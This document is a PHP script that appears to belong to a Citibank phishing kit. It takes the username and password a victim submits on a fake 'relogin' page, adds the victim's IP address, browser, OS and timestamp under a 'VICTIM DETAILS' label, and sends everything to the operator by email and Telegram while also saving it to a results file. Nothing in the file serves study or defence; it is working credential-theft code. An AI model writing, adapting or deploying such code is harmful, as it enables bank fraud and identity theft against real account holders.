<?php
$rootDir = dirname(__DIR__, 3);
$settings = require_once $rootDir . '/settings/settings.php';
require_once __DIR__ . '/telegram.php';

if (!is_array($settings)) {
    $settings = array();
}

if (!empty($settings['debug']) && $settings['debug'] == '1') {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
} else {
    error_reporting(0);
}

function get_client_ip() {
    $ipaddress = 'UNKNOWN';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
    return $ipaddress;
}

function getOS($useragent) {
    $os_platform = 'Unknown OS Platform';
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8', '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP', '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000', '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98', '/win95/i' => 'Windows 95', '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X', '/mac_powerpc/i' => 'Mac OS 9', '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu', '/iphone/i' => 'iPhone', '/ipod/i' => 'iPod', '/ipad/i' => 'iPad',
        '/android/i' => 'Android', '/blackberry/i' => 'BlackBerry', '/webos/i' => 'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function getBrowser($useragent) {
    $browser = 'Unknown Browser';
    $browser_array = array('/msie/i' => 'Internet Explorer', '/firefox/i' => 'Firefox', '/safari/i' => 'Safari', '/chrome/i' => 'Chrome', '/opera/i' => 'Opera', '/netscape/i' => 'Netscape', '/maxthon/i' => 'Maxthon', '/konqueror/i' => 'Konqueror', '/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser = $value;
        }
    }
    return $browser;
}

$username = trim($_POST['username1'] ?? '');
$password = trim($_POST['password1'] ?? '');

setcookie('logged_in', empty($username) || empty($password) ? '0' : '1', time() + 3600, '/');

if (empty($username) || empty($password)) {
    header('Location: ../index', true, 302);
    exit;
}

$IP = get_client_ip();
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
$os = getOS($useragent);
$browser = getBrowser($useragent);
$date = date('h:i:s d/m/Y');
$time = date('H:i:s');
$client = @file_get_contents($rootDir . '/Logs/client.txt');
if ($client === false) {
    $client = '0';
}

$logDir = $rootDir . '/Logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0777, true);
}

$message = "[🍁 | CITI RELOGIN | CLIENT :{$client} 🍁]\n\n";
$message .= "********** [ 💻 RELOGIN DETAILS 💻 ] **********\n";
$message .= "# USERNAME   : {$username}\n";
$message .= "# PASSWORD   : {$password}\n";
$message .= "********** [ 🌍 BROWSER DETAILS 🌍 ] **********\n";
$message .= "# USERAGENT  : {$useragent}\n";
$message .= "# LANGUAGE   : {$language}\n";
$message .= "# BROWSER    : {$browser}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# OS         : {$os}\n";
$message .= "# DATE       : {$date}\n";
$message .= "# TIME       : {$time}\n";
$message .= "**********************************************\n";

if (!empty($settings['send_mail']) && $settings['send_mail'] == '1') {
    $owner = $settings['email'] ?? 'unknown@example.com';
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: MrWeeBee <citibank@client_{$client}_site.com>\r\n";
    $subject = "🍁 CITI 🍁 RELOGIN 🍁 CLIENT #{$client} 🍁 {$IP}";
    @mail($owner, $subject, $message, $headers);
}

if (!empty($settings['save_results']) && $settings['save_results'] == '1') {
    file_put_contents($logDir . '/results.txt', $message, FILE_APPEND);
}

if (!empty($settings['telegram']) && $settings['telegram'] == '1') {
    send_telegram_message($settings, $message);
}

header('Location: ../emma.php', true, 302);
exit;
